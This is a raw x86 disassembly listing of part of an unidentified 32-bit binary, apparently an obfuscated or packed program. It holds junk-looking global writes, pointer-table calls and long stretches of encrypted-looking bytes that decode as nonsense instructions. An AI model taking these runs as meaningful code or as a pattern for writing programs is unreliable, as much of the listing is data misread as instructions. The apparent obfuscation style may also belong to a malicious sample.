  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4235d7,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx+0x379f8318],0x30
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x406361
  4063d4:	cwde   
  4063d5:	shl    BYTE PTR [edx-0x328a52fc],1
  4063db:	imul   edi,esp,0xe3695c98
  4063e1:	fs mov eax,0xcd39e92f
  4063e7:	pop    eax
  4063e8:	iret   
  4063e9:	in     eax,0xf2
  4063eb:	in     al,0xa0
  4063ed:	sbb    eax,0xf5474d10
  4063f2:	adc    ebp,DWORD PTR [eax]
  4063f4:	sbb    DWORD PTR [ebp+0x1eb1896a],esp
  4063fa:	push   0xffffffdf
  4063fc:	ret    0xe109
  4063ff:	(bad)  
  406400:	push   ebp
  406401:	pusha  
  406402:	pop    eax
  406403:	mov    ah,0x4a
  406405:	cdq    
  406406:	xor    eax,0x5fc7d0f4
  40640b:	add    DWORD PTR [edi],ebx
  40640d:	out    dx,eax
  40640e:	xor    al,0x9a
  406410:	mov    ecx,0xc9bf31d7
  406415:	scas   al,BYTE PTR es:[edi]
  406416:	rcr    BYTE PTR [esi-0x30],0x8
  40641a:	sbb    ch,BYTE PTR [edi-0x4172bd6]
  406420:	pop    esp
  406421:	inc    esi
  406422:	xor    DWORD PTR [esi],0x2f74ab7e
  406428:	sar    BYTE PTR [ecx+eiz*2],0x3
  40642c:	test   DWORD PTR [edx],0xa7f99405
  406432:	out    0x23,al
  406434:	cmp    DWORD PTR [esi-0x3d],esp
  406437:	jo     0x4063ca
  406439:	push   es
  40643a:	push   ebx
  40643b:	fwait
  40643c:	lods   al,BYTE PTR ds:[esi]
  40643d:	(bad)
  406441:	inc    ebx
  406442:	ret    
  406443:	mov    WORD PTR [edi+0x3e],?
  406446:	or     eax,0x1c2b83cc
  40644b:	cmp    DWORD PTR [ebx+0x3ee850af],0x77
  406452:	cmp    eax,0xc86eb279
  406457:	pop    eax
  406458:	imul   ecx,DWORD PTR [ebp+0x3be237e9],0x6bbac234
  406462:	aas    
  406463:	rcl    ebx,cl
  406465:	in     al,0x55
  406467:	sbb    eax,0x40ee39df
  40646c:	and    al,0xd
  40646e:	(bad)  
  406470:	shl    DWORD PTR [edx],1
  406472:	lea    edx,[esi]
  406474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406475:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406476:	mov    DWORD PTR [ebp+0x54],0xbc30c9c1
  40647d:	mov    ecx,0x508df6c4
  406482:	adc    edx,DWORD PTR [eax+0x7e]
  406485:	arpl   WORD PTR ds:0x4e42f529,ax
  40648b:	adc    bh,bh
  40648d:	mov    ds:0x60c67362,al
  406492:	jns    0x40643d
  406494:	jge    0x4064b0
  406496:	xor    DWORD PTR [ebx],esi
  406498:	lock mov edx,0x1375c725
  40649e:	rol    DWORD PTR [edi+0x2dd2c907],0x21
  4064a5:	aad    0xf3
  4064a7:	xchg   DWORD PTR [edi-0x5153dfb0],edx
  4064ad:	sub    ch,BYTE PTR [edi+ebp*8-0x710f9405]
  4064b4:	inc    eax
  4064b5:	iret   
  4064b6:	xchg   ecx,eax
  4064b7:	push   ds
  4064b8:	add    DWORD PTR [edx-0x6e52e265],ebp
  4064be:	arpl   WORD PTR [ebp+eiz*1+0x6ccb21ae],bx
  4064c5:	rcr    DWORD PTR [esi+edx*8-0x75],0x47
  4064ca:	dec    edi
  4064cb:	lock or DWORD PTR [edx+0x6164e6a9],0x6e5e085d
  4064d6:	fistp  WORD PTR [eax-0xd7347fe]
  4064dc:	xor    ebp,edi
  4064de:	mov    eax,DWORD PTR [eax]
  4064e0:	aad    0xd0
  4064e2:	(bad)  
  4064e4:	gs pop ds
  4064e6:	fcmovnbe st,st(5)
  4064e8:	icebp  
  4064e9:	jne    0x40647c
  4064eb:	push   0xffffff9d
  4064ed:	xlat   BYTE PTR ds:[ebx]
  4064ee:	bound  esi,QWORD PTR [ebp+0x45]
  4064f1:	pop    esp
  4064f2:	sahf   
  4064f3:	mov    edx,0xc473aaf8
  4064f8:	gs mov ebx,0x72b628a5
  4064fe:	sbb    BYTE PTR [ebp+0xf0a9fdb],dl
  406504:	xor    DWORD PTR [edx],ecx
  406506:	popf   
  406507:	mov    esp,0xf903f833
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x905a4057,edi
  406527:	dec    eax
  406528:	out    0x9f,eax
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	and    eax,eax
  406533:	xlat   BYTE PTR ds:[ebx]
  406534:	jbe    0x40650d
  406536:	sbb    eax,0xfff71d5
  40653b:	call   0xf7bcfafc
  406540:	shr    DWORD PTR [esi+eiz*1],1
  406543:	cs (bad) 
  406545:	pop    ebx
  406546:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406547:	test   DWORD PTR ds:0x41d8df33,ebp
  40654d:	xchg   edx,eax
  40654e:	jmp    0x4dffd2ce
  406553:	lods   al,BYTE PTR ds:[esi]
  406554:	call   0x75aecd8
  406559:	iret   
  40655a:	mov    ebx,0x94bc7323
  40655f:	loop   0x40654f
  406561:	ror    BYTE PTR [ebx+0x73bdac75],1
  406567:	(bad)
  40656b:	sub    ah,BYTE PTR [eax-0x6b]
  40656e:	clc    
  40656f:	mov    ecx,0x109d9e5b
  406574:	repnz (bad) 
  406576:	or     BYTE PTR [edx+0xf],cl
  406579:	jb     0x4064fe
  40657b:	inc    eax
  40657c:	adc    ch,BYTE PTR ds:0xbc9ae2ae
  406582:	fdiv   QWORD PTR [esi+edi*2-0xd]
  406586:	and    eax,0xe5224d28
  40658b:	and    esp,ebx
  40658d:	mov    bh,0x5c
  40658f:	ins    BYTE PTR es:[edi],dx
  406590:	mov    al,ds:0xb4ec3fb2
  406595:	imul   edx,eax,0x5bce65d
  40659b:	(bad)  
  40659c:	push   0x26
  40659e:	out    dx,eax
  40659f:	add    al,0xd4
  4065a1:	leave  
  4065a2:	push   ecx
  4065a3:	dec    ebp
  4065a4:	xchg   edi,eax
  4065a5:	retf   0x213c
  4065a8:	repz jnp 0x4065d5
  4065ab:	sbb    BYTE PTR [esp+ebx*1+0x79],ch
  4065af:	fidivr DWORD PTR [ecx-0x52]
  4065b2:	mov    dl,0xf8
  4065b4:	jns    0x40655a
  4065b6:	adc    al,0xf0
  4065b8:	mov    esi,0x1a4983e8
  4065bd:	(bad)  
  4065be:	fild   DWORD PTR [eax]
  4065c0:	xchg   ebx,eax
  4065c1:	xchg   BYTE PTR [edi-0x5ff6e725],cl
  4065c7:	jmp    0x7a3c75f
  4065cc:	rol    DWORD PTR [esi],0x92
  4065cf:	cmp    BYTE PTR ds:0x8879335b,dl
  4065d5:	out    dx,eax
  4065d6:	mov    ds:0xe3e1ef99,eax
  4065db:	cs into 
  4065dd:	sbb    eax,0xde4cbf10
  4065e2:	push   esp
  4065e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065e4:	in     eax,0xf9
  4065e6:	test   al,0x70
  4065e8:	add    cl,BYTE PTR [ebp+0x1]
  4065eb:	xchg   ecx,eax
  4065ec:	pop    esp
  4065ed:	es jp  0x40665c
  4065f0:	adc    eax,DWORD PTR [ebx]
  4065f2:	sahf   
  4065f3:	arpl   WORD PTR [ebx],dx
  4065f5:	pop    edi
  4065f6:	or     al,0xf2
  4065f8:	daa    
  4065f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065fa:	cdq    
  4065fb:	jp     0x406660
  4065fd:	dec    ecx
  4065fe:	pop    esp
  4065ff:	repnz pop edx
  406601:	retf   
  406602:	or     ecx,esp
  406604:	leave  
  406605:	enter  0x3887,0x8
  406609:	inc    esp
  40660a:	fiadd  WORD PTR ds:0xf43f86c5
  406610:	loope  0x40661e
  406612:	push   ebx
  406613:	dec    ecx
  406614:	lds    esp,FWORD PTR [edi+0x58ae4e3f]
  40661a:	lock fdiv st,st(4)
  40661d:	push   edx
  40661e:	push   es
  40661f:	cmp    DWORD PTR [ebp+0x66be9b3e],eax
  406625:	fcomp  st(4)
  406627:	mov    edx,0x1e3f3999
  40662c:	inc    esi
  40662d:	inc    edx
  40662e:	cmp    eax,0xc49b9a69
  406633:	mov    DWORD PTR [ecx-0x157f16bf],edi
  406639:	xor    DWORD PTR [ebx],eax
  40663b:	retf   
  40663c:	leave  
  40663d:	xchg   edi,eax
  40663e:	jecxz  0x40668a
  406640:	jle    0x40662d
  406642:	rcl    DWORD PTR [edx+0x67],1
  406645:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406646:	and    eax,ebx
  406648:	(bad)  
  406649:	ds stc 
  40664b:	scas   al,BYTE PTR es:[edi]
  40664c:	(bad)  
  40664d:	jns    0x4065d0
  40664f:	shl    bh,0x8e
  406652:	mov    ebx,0x9feddd4e
  406657:	(bad)  
  406658:	xor    BYTE PTR [ecx],bl
  40665a:	rcr    DWORD PTR [esi+0x32],1
  40665d:	retf   
  40665e:	scas   eax,DWORD PTR es:[edi]
  40665f:	test   al,0x53
  406661:	mov    ds:0x9f8a9797,al
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	xlat   BYTE PTR ds:[ebx]
  406749:	cld    
  40674a:	jnp    0x406737
  40674c:	inc    eax
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x40674d
  406755:	gs push edx
  406757:	lds    edx,FWORD PTR [edx+0xc0e4ab6]
  40675d:	pop    ecx
  40675e:	dec    edx
  40675f:	fnstcw WORD PTR [ebx]
  406761:	adc    al,0xcc
  406763:	inc    eax
  406764:	mov    ds,edx
  406766:	fucom  st(3)
  406768:	xchg   ecx,eax
  406769:	(bad)  
  40676a:	outs   dx,DWORD PTR ds:[esi]
  40676b:	bound  edi,QWORD PTR [ebp+0x54]
  40676e:	jmp    0x75be:0x404e0cb0
  406775:	int3   
  406776:	out    dx,al
  406777:	mov    ecx,0x4195aa98
  40677c:	es jne 0x40679c
  40677f:	scas   eax,DWORD PTR es:[edi]
  406780:	push   0x1d13e13e
  406785:	cmp    eax,DWORD PTR [edx-0x77]
  406788:	jp     0x406799
  40678a:	pop    ebx
  40678b:	push   esi
  40678c:	dec    edx
  40678d:	je     0x4067d4
  40678f:	xor    eax,0x772b0774
  406794:	aas    
  406795:	jne    0x406730
  406797:	pop    es
  406798:	push   cs
  406799:	inc    eax
  40679a:	push   eax
  40679b:	cmp    al,0x71
  40679d:	or     eax,0x58109589
  4067a2:	loope  0x40679c
  4067a4:	cli    
  4067a5:	imul   esi,ebp,0x5d7fce42
  4067ab:	dec    esi
  4067ac:	xor    eax,0x960dbf3d
  4067b1:	mov    dl,0x17
  4067b3:	mov    DWORD PTR [ebp-0x667f796e],ecx
  4067b9:	popa   
  4067ba:	sti    
  4067bb:	cld    
  4067bc:	std    
  4067bd:	sbb    ch,ah
  4067bf:	aad    0xf8
  4067c1:	or     BYTE PTR [ebx+esi*2-0x7efce3fa],cl
  4067c8:	clc    
  4067c9:	mov    dh,0xbc
  4067cb:	jno    0x406849
  4067cd:	div    BYTE PTR [esi-0x3e]
  4067d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067d1:	int3   
  4067d2:	mov    bl,0x37
  4067d4:	pop    es
  4067d5:	push   edx
  4067d6:	xchg   BYTE PTR [esi],cl
  4067d8:	aam    0x3f
  4067da:	xor    DWORD PTR [esi-0x11],ecx
  4067dd:	inc    ebp
  4067de:	and    eax,0x1a641eb4
  4067e3:	xchg   esp,eax
  4067e4:	in     al,0xc9
  4067e6:	cld    
  4067e7:	ret    
  4067e8:	retf   
  4067e9:	loopne 0x4067d2
  4067eb:	xor    ebp,DWORD PTR [esi-0x1a55b910]
  4067f1:	ret    0x55e6
  4067f4:	data16 in al,0x50
  4067f7:	aam    0xff
  4067f9:	ror    DWORD PTR [edx+0x2f20d10],0xac
  406800:	jnp    0x406823
  406802:	or     DWORD PTR [eax-0x6edd2978],0xffffffd4
  406809:	fwait
  40680a:	mov    ebx,0x2605fe
  40680f:	inc    esi
  406810:	pop    ecx
  406811:	inc    esp
  406812:	mov    eax,0x4332eb5b
  406817:	pop    esi
  406818:	(bad)  
  406819:	int    0x0
  40681b:	outs   dx,DWORD PTR ds:[esi]
  40681c:	cld    
  40681d:	cli    
  40681e:	cmp    al,0xce
  406820:	push   ds
  406821:	int3   
  406822:	stos   BYTE PTR es:[edi],al
  406823:	jb     0x4067f5
  406825:	or     BYTE PTR [ebp+0x2c],0x52
  406829:	inc    eax
  40682a:	add    ecx,DWORD PTR [edi]
  40682c:	retf   
  40682d:	icebp  
  40682e:	gs into 
  406830:	int    0x28
  406832:	lea    edi,[eax-0x6]
  406835:	cdq    
  406836:	xchg   ebx,eax
  406837:	xchg   esp,eax
  406838:	adc    BYTE PTR [edi+ecx*2+0x9],0x88
  40683d:	sub    BYTE PTR [esi],0xdc
  406840:	sub    BYTE PTR [ecx+0x2ee65185],dl
  406846:	retf   
  406847:	inc    ebp
  406848:	jne    0x4068c8
  40684a:	xchg   ecx,eax
  40684b:	popa   
  40684c:	out    dx,al
  40684d:	test   DWORD PTR [edi+edi*8-0x7c],esi
  406851:	ja     0x40680b
  406853:	adc    cl,BYTE PTR [ebx]
  406855:	jge    0x406853
  406857:	adc    al,0x3f
  406859:	aas    
  40685a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40685b:	sub    BYTE PTR [esi+ebp*4],dh
  40685e:	sar    dh,cl
  406860:	out    dx,al
  406861:	mov    edi,0xfd6030e5
  406866:	mov    bh,0x96
  406868:	imul   esp,DWORD PTR [esi+0x12],0xddca3a5c
  40686f:	sbb    BYTE PTR [edi],bl
  406871:	ror    BYTE PTR [ebx],0xb2
  406874:	es call 0x7b5b:0x24e615d2
  40687c:	sub    BYTE PTR es:[esi-0x57],0xdc
  406881:	imul   esp,DWORD PTR [eax-0x39836d22],0xffffff81
  406888:	jns    0x40688d
  40688a:	push   ebp
  40688b:	rol    bh,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0x4a
  4068b9:	xchg   ebp,eax
  4068ba:	push   cs
  4068bb:	gs jne 0x4068be
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x4068d4
  4068c5:	push   esi
  4068c6:	leave  
  4068c7:	dec    edi
  4068c8:	push   0x7d93739
  4068cd:	stos   DWORD PTR es:[edi],eax
  4068ce:	jmp    0x291e:0x173ee47b
  4068d5:	pop    eax
  4068d6:	dec    ebp
  4068d7:	and    DWORD PTR [eax],0xffffffd5
  4068da:	std    
  4068db:	pop    ss
  4068dc:	aad    0xa8
  4068de:	add    ecx,ebx
  4068e0:	add    al,bh
  4068e2:	ja     0x4068b2
  4068e4:	imul   DWORD PTR [esi-0x5558015]
  4068ea:	retf   
  4068eb:	daa    
  4068ec:	push   cs
  4068ed:	push   es
  4068ee:	add    edi,ebx
  4068f0:	iret   
  4068f1:	into   
  4068f2:	imul   ecx,DWORD PTR [eax-0x13],0x3
  4068f6:	int    0xbe
  4068f8:	pop    es
  4068f9:	xlat   BYTE PTR ds:[ebx]
  4068fa:	pusha  
  4068fb:	cmp    edx,ebx
  4068fd:	jo     0x40690f
  4068ff:	addr16 pop edx
  406901:	and    eax,0x7ea1f447
  406906:	mov    ebp,0x3f5ae0ae
  40690b:	jnp    0x406953
  40690d:	scas   al,BYTE PTR es:[edi]
  40690e:	dec    ecx
  40690f:	cmp    BYTE PTR [eax+0x20],bh
  406912:	pop    ebx
  406913:	xor    ecx,DWORD PTR ds:0x843ec9e5
  406919:	jbe    0x406948
  40691b:	div    cl
  40691d:	push   0xffffff88
  40691f:	dec    eax
  406920:	sub    esp,DWORD PTR [edi-0x1f]
  406923:	fsubr  QWORD PTR [ecx-0x2f2612dc]
  406929:	les    esi,FWORD PTR [eax+0x7e975b66]
  40692f:	lods   eax,DWORD PTR ds:[esi]
  406930:	fmul   st,st(5)
  406932:	data16 sub ah,dh
  406935:	jne    0x4068df
  406937:	mov    edi,0x2f44d96e
  40693c:	and    BYTE PTR [esi-0x43718eb4],dl
  406942:	rol    DWORD PTR [esi],cl
  406944:	imul   esi,DWORD PTR [ebp-0x68],0x2f
  406948:	xchg   esp,eax
  406949:	cli    
  40694a:	stc    
  40694b:	xchg   BYTE PTR [esi],cl
  40694d:	jne    0x40699e
  40694f:	push   esi
  406950:	or     DWORD PTR [eax],edx
  406952:	mov    eax,ds:0x7886bb85
  406957:	cmp    al,0x11
  406959:	and    DWORD PTR [ecx],esi
  40695b:	mov    esp,DWORD PTR [ebp+0x64f12336]
  406961:	dec    ebp
  406962:	jb     0x4069b1
  406964:	test   BYTE PTR [eax+0x15],bl
  406967:	hlt    
  406968:	shl    eax,0xf5
  40696b:	sbb    BYTE PTR ss:[esi+edi*1+0xc],dh
  406970:	fisttp DWORD PTR [ebx-0x6aafffaf]
  406976:	lods   eax,DWORD PTR ds:[esi]
  406977:	bound  eax,QWORD PTR [eax+ecx*2]
  40697a:	cmp    DWORD PTR [ebp+0x46],edi
  40697d:	mov    ah,0x37
  40697f:	int3   
  406980:	pop    edi
  406981:	sbb    ebp,esp
  406983:	or     BYTE PTR [edx],bl
  406985:	push   edx
  406986:	cld    
  406987:	inc    ebx
  406988:	mov    dl,0xc3
  40698a:	leave  
  40698b:	jg     0x4069ce
  40698d:	cli    
  40698e:	in     al,dx
  40698f:	hlt    
  406990:	cli    
  406991:	mov    esi,0x5551aa08
  406996:	push   es
  406997:	fwait
  406998:	inc    eax
  406999:	bound  eax,QWORD PTR [ecx+eiz*4]
  40699c:	neg    BYTE PTR [eax-0x80]
  40699f:	and    BYTE PTR [esi-0x6b],0x7f
  4069a3:	add    DWORD PTR [ecx],ebx
  4069a5:	xchg   cl,dh
  4069a7:	ins    BYTE PTR es:[edi],dx
  4069a8:	sar    DWORD PTR [ebx],cl
  4069aa:	fsubr  DWORD PTR [eax-0x6943e7f7]
  4069b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069b1:	and    ch,BYTE PTR [ebx-0x1b]
  4069b4:	in     eax,dx
  4069b5:	out    dx,al
  4069b6:	inc    ebp
  4069b7:	pop    ss
  4069b8:	pusha  
  4069b9:	sub    al,al
  4069bb:	pop    ebp
  4069bc:	adc    eax,0xd6e2c7de
  4069c1:	push   cs
  4069c2:	sbb    DWORD PTR [ecx-0x4f3be7a8],ebx
  4069c8:	pusha  
  4069c9:	dec    edi
  4069ca:	fisubr WORD PTR [esi+0x36]
  4069cd:	dec    ebp
  4069ce:	add    dh,ch
  4069d0:	addr16 add al,0x22
  4069d3:	pop    ebx
  4069d4:	pop    ecx
  4069d5:	add    ebp,esp
  4069d7:	inc    esi
  4069d8:	ins    DWORD PTR es:[edi],dx
  4069d9:	jmp    0xb3cf70f9
  4069de:	cmp    al,0x7
  4069e0:	pop    esi
  4069e1:	sub    eax,0x9f81abe7
  4069e6:	lods   al,BYTE PTR ds:[esi]
  4069e7:	test   BYTE PTR [edx+0x31],cl
  4069ea:	fwait
  4069eb:	mov    ch,0xc5
  4069ed:	xor    bh,BYTE PTR [edi-0x70c0e4a9]
  4069f3:	aad    0x18
  4069f5:	out    dx,eax
  4069f6:	jno    0x406a75
  4069f8:	inc    edi
  4069f9:	xor    edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0xaf377a93
  406a0e:	fmul   DWORD PTR [ebx+0x7e7e013e]
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069b4
  406a19:	xor    eax,0xc959a60c
  406a1e:	cmp    eax,0x8c3da8b1
  406a23:	dec    ebx
  406a24:	enter  0xec2e,0xb5
  406a28:	jne    0x406a75
  406a2a:	pop    esi
  406a2b:	dec    ecx
  406a2c:	js     0x406a97
  406a2e:	inc    ebp
  406a2f:	jl     0x406a13
  406a31:	dec    edi
  406a32:	or     BYTE PTR [edx],dh
  406a34:	or     esp,DWORD PTR [ebx-0x1a]
  406a37:	aaa    
  406a38:	pop    edi
  406a39:	fbstp  TBYTE PTR [ecx+0x5341c68f]
  406a3f:	mov    bh,0x28
  406a41:	sbb    DWORD PTR [ebx],eax
  406a43:	cli    
  406a44:	fild   DWORD PTR [ebp+0x3f]
  406a47:	inc    eax
  406a48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a4a:	popf   
  406a4b:	mov    dh,0xec
  406a4d:	in     eax,dx
  406a4e:	stc    
  406a4f:	pop    esi
  406a50:	rol    DWORD PTR [edi+0x7f],cl
  406a53:	std    
  406a54:	jbe    0x406a68
  406a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a58:	fld    TBYTE PTR [eax+ecx*2+0x2732ff42]
  406a5f:	sub    dl,cl
  406a61:	mov    ds:0x2183da1c,eax
  406a66:	test   DWORD PTR [eax-0x3e],edi
  406a69:	mov    eax,0xe8a73b75
  406a6e:	adc    eax,0xf3ee3e07
  406a73:	mov    bl,0x9b
  406a75:	jne    0x406a1f
  406a77:	test   cl,bl
  406a79:	shl    BYTE PTR [eax+esi*4-0x26],0x1
  406a7e:	loopne 0x406a74
  406a80:	pop    ecx
  406a81:	pop    ss
  406a82:	sub    dl,BYTE PTR [eax]
  406a84:	jmp    0x23088317
  406a89:	ret    0x4625
  406a8c:	(bad)  
  406a8d:	aaa    
  406a8e:	dec    edx
  406a8f:	pusha  
  406a90:	cmp    bl,BYTE PTR [ebp+eax*1-0x3a]
  406a94:	or     BYTE PTR [edi+0xa10c8b1],dh
  406a9a:	pop    ss
  406a9b:	cmp    DWORD PTR [eax+0x4b],esp
  406a9e:	or     ah,bl
  406aa0:	mov    BYTE PTR [ebp-0x57],al
  406aa3:	nop
  406aa4:	loope  0x406a4f
  406aa6:	dec    esi
  406aa7:	mov    edi,0xddd8916d
  406aac:	loope  0x406b18
  406aae:	jg     0x406a5a
  406ab0:	das    
  406ab1:	out    0xcc,al
  406ab3:	dec    ebp
  406ab4:	or     edx,ecx
  406ab6:	and    al,0xeb
  406ab8:	cld    
  406ab9:	retfw  0x7e42
  406abd:	scas   al,BYTE PTR es:[edi]
  406abe:	fsubr  QWORD PTR [ebx-0x281379ce]
  406ac4:	test   DWORD PTR gs:[ebx+0x7babf566],ecx
  406acb:	out    dx,eax
  406acc:	mov    ds:0xf7761524,eax
  406ad1:	pop    eax
  406ad2:	shl    BYTE PTR [edi-0x70],0xed
  406ad6:	adc    al,dh
  406ad8:	sub    eax,0x7dc07e04
  406add:	and    eax,0xa6090490
  406ae2:	cmp    eax,0x865aae99
  406ae7:	ins    DWORD PTR es:[edi],dx
  406ae8:	js     0x406adc
  406aea:	popa   
  406aeb:	loop   0x406b08
  406aed:	add    al,0xf2
